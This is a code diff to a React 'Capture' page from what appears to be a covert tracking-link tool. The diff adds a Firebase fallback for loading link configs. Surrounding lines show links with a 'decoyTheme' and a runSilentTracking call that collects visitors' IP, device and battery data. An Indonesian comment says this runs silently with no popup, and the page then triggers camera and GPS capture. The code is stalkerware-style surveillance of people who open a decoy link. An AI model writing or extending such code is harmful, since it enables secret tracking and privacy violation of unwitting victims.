@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from 'react';
 import { useParams, useLocation } from 'react-router-dom';
-import { decodeConfig, addCapture } from '../storage';
+import { decodeConfig, readConfigFromFirebase, addCapture } from '../storage';
 
 /* ─── UA Parser (Mobile-Optimized) ─────────────────────── */
 function parseUA(ua) {
@@ -489,17 +489,28 @@ export default function Capture() {
     if (ranRef.current) return;
     ranRef.current = true;
     if (!trackId) { setNotFound(true); return; }
-    const cfg = decodeConfig(trackId);
-    if (!cfg)   { setNotFound(true); return; }
 
-    setConfig(cfg);
-    configRef.current = cfg;                          // simpan ke ref
-    notifRef.current  = cfg.notif || null;
-    const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
-    linkRef.current = link;
+    async function loadConfig() {
+      let cfg = decodeConfig(trackId);
+      if (!cfg) {
+        cfg = await readConfigFromFirebase(null, trackId);
+      }
+      if (!cfg) {
+        setNotFound(true);
+        return;
+      }
 
-    // IP + Device + Battery — semuanya SILENT, tanpa popup apapun
-    runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
+      setConfig(cfg);
+      configRef.current = cfg;                          // simpan ke ref
+      notifRef.current  = cfg.notif || null;
+      const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
+      linkRef.current = link;
+
+      // IP + Device + Battery — semuanya SILENT, tanpa popup apapun
+      runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
+    }
+
+    loadConfig();
   }, [trackId]);
 
   // GPS dipanggil dari banner → gunakan ref agar tidak stale
